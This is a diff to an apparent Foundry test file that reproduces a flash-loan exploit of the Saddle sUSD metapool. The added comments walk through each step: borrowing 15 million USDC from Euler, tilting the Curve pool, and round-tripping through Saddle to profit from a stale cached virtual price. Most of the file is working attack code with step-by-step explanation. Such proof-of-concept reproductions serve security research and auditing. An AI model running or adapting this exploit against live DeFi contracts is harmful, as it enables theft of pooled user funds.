@@ -33,6 +33,8 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        // EXPLOIT ENTRY: Flashloan + roundtrip manipulation of Saddle sUSD metapool virtual price.
+        // The root vulnerability is lack of fresh base-pool virtual price sync on metapool swaps (cache 10min).
         IEuler(eulerLoans).flashLoan(address(this), usdc, 15_000_000e6, new bytes(0));
         console.log("USDC hacked: %s", IERC20(usdc).balanceOf(address(this)));
     }
@@ -52,17 +54,24 @@ contract ContractTest is Test {
     }
 
     function attack() internal {
-        //Swap USDC to SUSD Via Curve
+        // EXPLOIT STEP 0: Receive flash-loaned USDC from Euler (0-fee ERC-3156). Large size chosen to move both metapool and underlying Curve base pool.
+
+        // EXPLOIT STEP 1: Swap USDC to SUSD Via Curve base pool (tilts Curve reserves toward sUSD, changing its virtual price for the LP token).
         console.log("USDC loaned: %s", IERC20(usdc).balanceOf(address(this)));
         uint256 amount = IERC20(usdc).balanceOf(address(this));
         IERC20(usdc).approve(curvepool, amount);
         ICurve(curvepool).exchange(1, 3, amount, 1);
         console.log("SUSD exchanged: %s", IERC20(susd).balanceOf(address(this)));
 
+        // EXPLOIT STEP 2: Swap large sUSD into Saddle metapool for saddleUSDV2 LP (index 0->1). This is the first leg.
         //Attack
         swapToSaddle(IERC20(susd).balanceOf(address(this)));
+
+        // EXPLOIT STEP 3: Immediately reverse: swap the received LP back to sUSD (index 1->0).
+        // Uses the *stale* cached base virtual price (no re-sync in same tx) => receives MORE sUSD than input.
         swapFromSaddle();
 
+        // EXPLOIT STEP 4: Swap surplus sUSD back to USDC via Curve. Realize the round-trip profit.
         //Swap Susd to USDC via curve
         amount = IERC20(susd).balanceOf(address(this));
         IERC20(susd).approve(curvepool, amount);
@@ -73,6 +82,8 @@ contract ContractTest is Test {
     function swapToSaddle(
         uint256 amountStart
     ) internal {
+        // EXPLOIT STEP 2 (detail): Saddle swap(0,1) sUSD -> saddleUSDV2 LP.
+        // This call updates metapool balances but the LP valuation inside used stale base virtual price.
         //Swap SUSD for SaddleUSDV2
         uint256 amount = amountStart;
         IERC20(susd).approve(saddlepool, amount);
@@ -81,6 +92,10 @@ contract ContractTest is Test {
     }
 
     function swapFromSaddle() internal {
+        // EXPLOIT STEP 3 (detail): Saddle swap(1,0) LP -> sUSD. The critical profitable leg.
+        // The metapool's _calculateSwap (via MetaSwapUtils) prices using the *unchanged* cached virtual price
+        // even though Step 1 + this tx's Step2 already moved the underlying Curve pool's reserves/virtual price.
+        // Result: dy is inflated.
         //Swap SaddleUSDV2 for SUSD
         uint256 amount = IERC20(saddleUsdV2).balanceOf(address(this));
         IERC20(saddleUsdV2).approve(saddlepool, amount);
